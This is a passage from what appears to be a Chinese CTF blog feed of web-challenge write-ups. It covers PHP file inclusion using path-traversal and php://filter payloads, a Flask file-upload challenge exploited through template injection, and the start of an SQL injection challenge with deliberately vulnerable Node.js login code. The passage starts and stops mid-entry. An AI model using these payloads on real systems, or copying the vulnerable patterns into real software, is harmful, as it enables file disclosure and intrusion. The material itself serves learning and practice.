class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看代码主体部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>       &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>       &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>   ) &#123;<br>       <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>       <span class="hljs-keyword">exit</span>;<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>   &#125;  <br></code></pre></td></tr></table></figure><p>明确了传入一个参数file，并且如果满足：</p><p>file不为空（被赋值）；是字符串；传入emmm类中的checkFile()方法后返回值为真。则能够将file包含。</p><p>审计emmm类，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br></code></pre></td></tr></table></figure><p>白名单中包含”source.php”和”hint.php”，source.php就是本页面，传入file&#x3D;hint.php对hint.php进行包含（一开始做的时候真的以为是什么提示硬是想不看提示自己琢磨结果发现无论如何还是得看的呜呜呜呜呜）</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213021555716.png"></p><p>告诉了我们得到flag不是在这，而是在ffffllllaaaagggg，继续审计，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>$page必须是有被赋值而且是字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>$page如果在白名单内（source.php和hint.php）则返回true。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br></code></pre></td></tr></table></figure><p>mb_substr(a,b,c)，对a字符串进行截取，从第b位开始，截取c个字符串长度，返回截取的字符串；</p><p>mb_strpos(a,b)，返回字符串b在字符串a中<em><strong>第一次</strong></em>出现的位置，如果没出现过则返回false；</p><p>mb_substr()截取$page，从第一个字符开始，截取长度为mb_strpos($page.’?’,’?’)，即问号在字符串page$.’?’（就是$page字符串最后面跟一个问号）中<em><strong>第一次</strong></em>出现的位置，记住是第一次，$page.’?’末尾的问号未必是第一次出现的位置。截取到的字符串赋值给$_page。（注意分清变量名）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果$_page在白名单里，则返回true，$_page的值我们是可以决定的，所以传入的file的值应以字符串”hint.php?”或者”source.php?”开头，这样一来经过mb_sudstr()的截取最终将”hint.php”或”source.php”与白名单进行对比返回为true。</p><p>到此为止已经满足了主体部分的三个条件了，结合hint.php的提示flag在ffffllllaaaagggg，传参?file&#x3D;hint.php?ffffllllaaaagggg，没有结果判断flag不在本目录，盲猜在根目录，于是</p><p>payload：</p><p>?file&#x3D;hint.php?.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg  或  ?file&#x3D;source?.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213024856357.png"></p><hr><h2 id="BUUCTF-新生赛include1"><a href="#BUUCTF-新生赛include1" class="headerlink" title="BUUCTF_新生赛include1"></a>BUUCTF_<strong>新生赛include1</strong></h2><p>一开始只有一个tips超链接，点击，提示“Can you find out the flag?”。查看源代码没有任何收获，发现url的位置是通过file传参，file&#x3D;flag.php。想到应该是主页源码含有文件包含，通过包含参数file。尝试php伪协议。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">?file=php://input<br></code></pre></td></tr></table></figure><p>页面发出警告“hacker!”尝试大写绕过失败，尝试filter伪协议读取网页源码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213113603645.png"></p><p>base64解码后拿到flag</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213113736893.png"></p><p>题后反思：用同样的方法查看了一下index.php源码</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213114000858.png"></p><p>过滤函数使用的是stristr()是不区分大小写的，strstr()则区分，同样还过滤掉了zip:&#x2F;&#x2F;和phar:&#x2F;&#x2F;还有data:&#x2F;&#x2F;。顺路学了下文件上传的zip:&#x2F;&#x2F;和phar:&#x2F;&#x2F;协议注入。</p><hr>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="2023FCTF热身赛filechecker-mini"><a href="#2023FCTF热身赛filechecker-mini" class="headerlink" title="2023FCTF热身赛filechecker_mini"></a>2023FCTF热身赛filechecker_mini</h2><p>打开题目，让我们上传一个文件：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429032204160.png"></p><p>桌面上随便丢了个php文件进去提交看看会有啥情况：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429032353870.png"></p><p>判断文件类型，(MIME绕过预定)</p><p>附件下载下来先看源码：</p><p>index.html：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429030651913.png"></p><p>可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> waitress <span class="hljs-keyword">import</span> serve<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>app_dir = os.path.split(os.path.realpath(__file__))[<span class="hljs-number">0</span>]<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app_dir&#125;</span>/upload/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,result=<span class="hljs-string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file-upload&#x27;</span>]<br>            filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)<br><br>            <span class="hljs-keyword">if</span> os.path.exists(filepath) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filepath:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                f.save(filepath)<br>                file_check_res = subprocess.check_output(<br>                    [<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>                    shell=<span class="hljs-literal">False</span>, <br>                    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>                    timeout=<span class="hljs-number">1</span><br>                )<br>                os.remove(filepath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-keyword">in</span> file_check_res <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;cannot open&quot;</span> <span class="hljs-keyword">in</span> file_check_res:<br>                    file_check_res=<span class="hljs-string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span><br>                <span class="hljs-keyword">return</span> render_template_string(file_check_res)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    serve(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>, threads=<span class="hljs-number">1000</span>, cleanup_interval=<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429032742576.png"></p><p>上面大家都用<code>render_template()</code>就你爱用<code>render_template_string()</code>是吧（指指点点，一眼模板注入，那么我们就希望<code>file_check_res</code>里有我们能够执行的rce代码。<code>file_check_res</code>哪来的？倒退往上看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f.save(filepath)<br>file_check_res = subprocess.check_output(<br>[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>shell=<span class="hljs-literal">False</span>, <br>encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>imeout=<span class="hljs-number">1</span><br>)<br>os.remove(filepath)<br></code></pre></td></tr></table></figure><p>先保存filepath这样一个文件，<code>subprocess.check_output(command)</code>返回Linux命令行输出，然后再把filepath文件删除，那么这里的<code>file_check_res</code>就是<code>file -b &#123;filepath&#125;</code>的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用<code>file -b</code> 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型，</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429034451879.png"></p><p>代码中的-b参数作用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b 　#列出辨识结果时，不显示文件名称。<br></code></pre></td></tr></table></figure><p>所以在文件名上动手脚的想法也破灭了（悲。</p><p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429191534591.png"></p><p>点开tests里面是各种针对该<code>file</code>命令的<a href="https://github.com/file/file/tree/master/tests">测试结果</a></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429191635511.png"></p><p>这8个分别分别是在文本中写入bash脚本的4种情况和对应的用<code>file</code>命令执行的输出结果，可以看出如果文本内容为<code>#!/usr/bin</code>开头的那么输出结果中会显示文本中的其他内容。</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429191927593.png"></p><p>本地做测试：创建一个文本文件修改内容如下</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429193849800.png"></p><p>测试结果如下：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429193915755.png"></p><p>显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429194117415.png"></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429194209528.png"></p><p>存在ssti漏洞，开始利用，调用os模块</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429195640928.png"></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429195803084.png"></p><p>调用popen()方法。</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230429195958840.png"></p><p>上传文件，获取flag。</p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI</title>
    <link href="/2023/02/09/SQLI/"/>
    <url>/2023/02/09/SQLI/</url>
    
    <content type="html"><![CDATA[<h2 id="CTF-After-Dark-Injection-Perfection"><a href="#CTF-After-Dark-Injection-Perfection" class="headerlink" title="CTF After Dark-Injection Perfection"></a>CTF After Dark-Injection Perfection</h2><p>因为想起来要把这道题收进来的时候网站已经关闭了（悲，所以没法复现题目环境，题目的页面就是一般的登录页面，用户名，密码，提交，题目要求使用admin账户登录。还好赛题部分源码还能下载。这是app.js内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><br><span class="hljs-keyword">const</span> port = <span class="hljs-built_in">parseInt</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span>) || <span class="hljs-number">8080</span>;<br><br><span class="hljs-keyword">const</span> sqlite3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sqlite3&#x27;</span>);<br><span class="hljs-keyword">const</span> db = <span class="hljs-keyword">new</span> sqlite3.<span class="hljs-title class_">Database</span>(<span class="hljs-string">&#x27;app.db&#x27;</span>, sqlite3.<span class="hljs-property">OPEN_READONLY</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> upload = <span class="hljs-title function_">multer</span>();<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(upload.<span class="hljs-title function_">array</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>));<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">getFavColor</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">username</span>) =&gt; &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;SELECT fav_color FROM users WHERE username=?&#x27;</span>, username, <span class="hljs-function">(<span class="hljs-params">err, row</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(err);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(row.<span class="hljs-property">fav_color</span>);<br>&#125;);<br>&#125;);<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">attemptLogin</span> = (<span class="hljs-params">username, password</span>) =&gt; &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">`SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;`</span>, <span class="hljs-keyword">async</span> (err, row) =&gt; &#123;<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(err);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (row === <span class="hljs-literal">undefined</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;Invalid User&#x27;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (password === row.<span class="hljs-property">password</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`My favorite color is <span class="hljs-subst">$&#123;<span class="hljs-keyword">await</span> getFavColor(row.username)&#125;</span>`</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;incorrect password&#x27;</span>);<br>&#125;);<br>&#125;)<br>&#125;;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;login.html&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br><span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br><span class="hljs-keyword">const</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br><br><span class="hljs-keyword">if</span> (!username || !password)<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Invalid Login&quot;</span>);<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">attemptLogin</span>(username, password));<br>&#125; <span class="hljs-keyword">catch</span> (err) &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(err);<br>&#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;not found&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>本题重点在第29行这个回调函数，从数据库调数据与用户输入进行比对，那就看看这个后端判断登录的逻辑是什么样的吧：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">db.<span class="hljs-title function_">get</span>(<span class="hljs-string">`SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;`</span>, <span class="hljs-keyword">async</span> (err, row) =&gt; &#123;<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(err);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (row === <span class="hljs-literal">undefined</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;Invalid User&#x27;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (password === row.<span class="hljs-property">password</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`My favorite color is <span class="hljs-subst">$&#123;<span class="hljs-keyword">await</span> getFavColor(row.username)&#125;</span>`</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;incorrect 